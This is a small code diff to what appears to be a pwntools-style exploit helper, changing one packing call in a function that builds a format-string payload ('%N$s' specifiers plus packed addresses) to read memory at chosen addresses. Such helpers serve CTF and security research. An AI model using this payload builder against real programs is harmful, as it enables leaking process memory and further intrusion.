@@ -18,7 +18,7 @@ def deref_payload(buffer_offset: int, addr: List[int]):
     payload = '||'.join("%{}$s".format(i) for i in range(off, off+len(addr)))
     payload = '^^' + payload + '$$'
     payload = payload.ljust(extra_offset*context.bits//8,'\x19').encode()
-    payload += b''.join(map(packn, addr))
+    payload += b''.join(map(pack, addr))
     return payload
 
 def deref_extractor(resp: bytes):
